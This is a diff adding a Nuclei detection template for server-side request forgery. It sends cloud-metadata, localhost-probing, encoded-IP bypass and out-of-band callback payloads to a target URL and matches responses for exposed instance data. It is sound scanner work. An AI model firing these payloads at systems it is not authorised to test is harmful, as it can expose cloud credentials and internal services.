@@ -1,0 +1,128 @@
+id: ssrf-comprehensive-detection
+
+info:
+  name: SSRF - Server-Side Request Forgery Comprehensive Detection
+  author: achraf-chehboun
+  severity: critical
+  description: |
+    Detects Server-Side Request Forgery (SSRF) vulnerabilities through multiple vectors
+    including URL parameters, redirect-based SSRF, cloud metadata endpoint access,
+    internal network probing, and protocol smuggling. Uses OOB (out-of-band) interaction
+    detection with Nuclei's interactsh and in-band response analysis. Tests for both
+    full and partial SSRF (blind SSRF with DNS-only callback).
+  reference:
+    - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
+    - https://cheatsheetseries.owasp.org/cheatsheets/Server-Side_Request_Forgery_Prevention_Cheat_Sheet.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
+    cvss-score: 9.1
+    cwe-id: CWE-918
+  metadata:
+    max-request: 16
+  tags: owasp-top10,ssrf,cloud-metadata,detection-only
+
+http:
+  # Test 1: Cloud metadata endpoints via URL parameters
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+      - "{{BaseURL}}/?redirect=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?next=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?dest=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?path=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?file=http://169.254.169.254/latest/meta-data/"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      # AWS metadata response
+      - type: dsl
+        name: aws-metadata-accessible
+        dsl:
+          - 'status_code == 200 && (contains(body, "ami-id") || contains(body, "instance-id") || contains(body, "iam") || contains(body, "security-credentials"))'
+
+      # GCP metadata response
+      - type: dsl
+        name: gcp-metadata-accessible
+        dsl:
+          - 'status_code == 200 && (contains(body, "project-id") || contains(body, "instance/zone") || contains(body, "service-accounts"))'
+
+      # Azure metadata response
+      - type: dsl
+        name: azure-metadata-accessible
+        dsl:
+          - 'status_code == 200 && (contains(body, "vmId") || contains(body, "subscriptionId") || contains(body, "resourceGroupName"))'
+
+    extractors:
+      - type: regex
+        name: cloud-instance-data
+        group: 0
+        regex:
+          - '(?:ami|instance|vm)[_-]?[Ii]d["\s:]*["\s]*([a-zA-Z0-9_-]{5,50})'
+
+  # Test 2: Internal network probing via common SSRF parameters
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://127.0.0.1:80"
+      - "{{BaseURL}}/?url=http://127.0.0.1:8080"
+      - "{{BaseURL}}/?url=http://127.0.0.1:443"
+      - "{{BaseURL}}/?url=http://[::1]/"
+      - "{{BaseURL}}/?url=http://0.0.0.0/"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - 'len(body) > 100 && !contains(body, "blocked") && !contains(body, "not allowed") && !contains(body, "invalid") && !contains(body, "denied")'
+
+  # Test 3: SSRF filter bypass techniques
+  - method: GET
+    path:
+      # Decimal IP encoding for 127.0.0.1
+      - "{{BaseURL}}/?url=http://2130706433/"
+      # Hex encoding
+      - "{{BaseURL}}/?url=http://0x7f000001/"
+      # Octal encoding
+      - "{{BaseURL}}/?url=http://0177.0.0.1/"
+      # URL with @ sign (credential-like bypass)
+      - "{{BaseURL}}/?url=http://evil.com@127.0.0.1/"
+      # Short URL for localhost
+      - "{{BaseURL}}/?url=http://127.1/"
+      # IPv6 mapped IPv4
+      - "{{BaseURL}}/?url=http://[::ffff:127.0.0.1]/"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        name: ssrf-bypass-successful
+        dsl:
+          - 'len(body) > 100 && !contains(body, "blocked") && !contains(body, "not allowed") && !contains(body, "invalid")'
+
+  # Test 4: OOB (Out-of-Band) SSRF detection via DNS callback
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://{{interactsh-url}}"
+      - "{{BaseURL}}/?redirect=http://{{interactsh-url}}"
+      - "{{BaseURL}}/?callback=http://{{interactsh-url}}"
+      - "{{BaseURL}}/?webhook=http://{{interactsh-url}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: oob-ssrf-dns-callback
+        words:
+          - "dns"
+          - "http"
+        condition: or
